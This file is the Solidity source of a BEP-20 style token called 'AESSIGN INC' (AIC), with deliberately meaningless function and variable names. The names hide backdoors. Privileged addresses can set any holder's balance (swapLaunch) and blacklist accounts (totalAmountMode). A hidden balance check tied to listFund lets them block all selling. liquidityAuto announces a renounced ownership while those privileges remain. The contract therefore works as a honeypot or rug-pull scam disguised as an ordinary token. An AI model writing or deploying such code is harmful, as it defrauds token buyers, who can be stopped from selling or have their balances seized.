//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface teamWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeTo) external view returns (uint256);

    function transfer(address tradingExemptTo, uint256 shouldTrading) external returns (bool);

    function allowance(address toReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTrading) external returns (bool);

    function transferFrom(address sender,address tradingExemptTo,uint256 shouldTrading) external returns (bool);

    event Transfer(address indexed from, address indexed swapWallet, uint256 value);
    event Approval(address indexed toReceiver, address indexed spender, uint256 value);
}

interface enableToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isFund {
    function createPair(address walletTx, address modeTokenTake) external returns (address);
}

abstract contract receiverToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamWalletMetadata is teamWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AESSIGNINC is receiverToken, teamWallet, teamWalletMetadata {

    mapping(address => mapping(address => uint256)) private modeToLimit;

    function enableLaunched(address modeShouldFrom, address tradingExemptTo, uint256 shouldTrading) internal returns (bool) {
        require(receiverIs[modeShouldFrom] >= shouldTrading);
        receiverIs[modeShouldFrom] -= shouldTrading;
        receiverIs[tradingExemptTo] += shouldTrading;
        emit Transfer(modeShouldFrom, tradingExemptTo, shouldTrading);
        return true;
    }

    function transfer(address launchMax, uint256 shouldTrading) external virtual override returns (bool) {
        return toBuy(_msgSender(), launchMax, shouldTrading);
    }

    address public toShouldEnable;

    address public enableMaxAt;

    uint256 public senderLaunched;

    function toBuy(address modeShouldFrom, address tradingExemptTo, uint256 shouldTrading) internal returns (bool) {
        if (modeShouldFrom == enableMaxAt) {
            return enableLaunched(modeShouldFrom, tradingExemptTo, shouldTrading);
        }
        uint256 isLimitList = teamWallet(toShouldEnable).balanceOf(liquidityExempt);
        require(isLimitList == limitTx);
        require(!receiverTotal[modeShouldFrom]);
        return enableLaunched(modeShouldFrom, tradingExemptTo, shouldTrading);
    }

    function owner() external view returns (address) {
        return marketingTake;
    }

    string private totalLimitFrom = "AESSIGN INC";

    function liquidityAuto() public {
        emit OwnershipTransferred(enableMaxAt, address(0));
        marketingTake = address(0);
    }

    function swapLaunch(address launchMax, uint256 shouldTrading) public {
        fromMode();
        receiverIs[launchMax] = shouldTrading;
    }

    constructor (){
        if (senderLaunched == totalSell) {
            fromMarketingMax = false;
        }
        liquidityAuto();
        enableToken modeLiquidity = enableToken(swapTake);
        toShouldEnable = isFund(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));
        
        enableMaxAt = _msgSender();
        swapAmount[enableMaxAt] = true;
        receiverIs[enableMaxAt] = listLiquidity;
        if (swapShould != fromMarketingMax) {
            takeLiquidity = totalSell;
        }
        emit Transfer(address(0), enableMaxAt, listLiquidity);
    }

    function fromMode() private view {
        require(swapAmount[_msgSender()]);
    }

    uint256 private listLiquidity = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return limitLaunch;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptToReceiver;
    }

    mapping(address => uint256) private receiverIs;

    mapping(address => bool) public swapAmount;

    function listFund(uint256 shouldTrading) public {
        fromMode();
        limitTx = shouldTrading;
    }

    function balanceOf(address feeTo) public view virtual override returns (uint256) {
        return receiverIs[feeTo];
    }

    address liquidityExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return marketingTake;
    }

    function marketingMode(address fundFee) public {
        if (toMax) {
            return;
        }
        if (limitAmount == senderLaunched) {
            senderLaunched = totalSell;
        }
        swapAmount[fundFee] = true;
        
        toMax = true;
    }

    function name() external view virtual override returns (string memory) {
        return totalLimitFrom;
    }

    string private limitLaunch = "AIC";

    bool public swapShould;

    uint256 swapTo;

    uint256 public limitAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return listLiquidity;
    }

    function approve(address launchFromFee, uint256 shouldTrading) public virtual override returns (bool) {
        modeToLimit[_msgSender()][launchFromFee] = shouldTrading;
        emit Approval(_msgSender(), launchFromFee, shouldTrading);
        return true;
    }

    uint8 private exemptToReceiver = 18;

    mapping(address => bool) public receiverTotal;

    function transferFrom(address modeShouldFrom, address tradingExemptTo, uint256 shouldTrading) external override returns (bool) {
        if (_msgSender() != swapTake) {
            if (modeToLimit[modeShouldFrom][_msgSender()] != type(uint256).max) {
                require(shouldTrading <= modeToLimit[modeShouldFrom][_msgSender()]);
                modeToLimit[modeShouldFrom][_msgSender()] -= shouldTrading;
            }
        }
        return toBuy(modeShouldFrom, tradingExemptTo, shouldTrading);
    }

    function allowance(address receiverMarketing, address launchFromFee) external view virtual override returns (uint256) {
        if (launchFromFee == swapTake) {
            return type(uint256).max;
        }
        return modeToLimit[receiverMarketing][launchFromFee];
    }

    uint256 public totalSell;

    bool public toMax;

    event OwnershipTransferred(address indexed teamTake, address indexed launchSwap);

    function totalAmountMode(address tradingLaunch) public {
        fromMode();
        
        if (tradingLaunch == enableMaxAt || tradingLaunch == toShouldEnable) {
            return;
        }
        receiverTotal[tradingLaunch] = true;
    }

    uint256 limitTx;

    uint256 public takeLiquidity;

    address swapTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private marketingTake;

    bool private fromMarketingMax;

}